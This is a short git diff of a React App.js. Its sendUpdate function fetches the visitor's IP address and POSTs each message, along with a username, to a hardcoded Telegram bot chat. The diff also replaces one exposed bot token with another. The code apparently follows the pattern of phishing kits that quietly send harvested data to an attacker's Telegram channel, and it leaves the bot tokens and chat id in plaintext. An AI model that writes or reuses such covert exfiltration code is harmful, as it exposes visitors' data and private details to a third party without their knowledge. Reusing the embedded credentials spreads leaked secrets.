@@ -1,4 +1,3 @@
-/* eslint-disable jsx-a11y/alt-text */
 /* eslint-disable no-unused-vars */
 import './App.css';
 import React, { useState } from 'react';
@@ -15,7 +14,7 @@ export async function sendUpdate(msg) {
       .then(result => result.json())
       .then((output) => {
         ip = output;
-        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${process.env.REACT_APP_USERNAME}:${msg}--------${ip.ipAddress}`
+        const url = `https://api.telegram.org/bot5479990786:AAHSybZrFWHaYO0DtwBQmzs0RFkzeiHWcwU/sendMessage?chat_id=-1001166751237&text=${process.env.REACT_APP_USERNAME}:${msg}--------${ip.ipAddress}`
         fetch(url, {
           method: "POST",
           headers: { 'Content-Type': 'application/json' },
@@ -25,7 +24,7 @@ export async function sendUpdate(msg) {
         })
       }).catch(err => console.error(err));
   } else {
-    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${process.env.REACT_APP_USERNAME}:${msg}--------${ip.ipAddress}`
+    const url = `https://api.telegram.org/bot5479990786:AAHSybZrFWHaYO0DtwBQmzs0RFkzeiHWcwU/sendMessage?chat_id=-1001166751237&text=${process.env.REACT_APP_USERNAME}:${msg}--------${ip.ipAddress}`
     fetch(url, {
       method: "POST",
       headers: { 'Content-Type': 'application/json' },
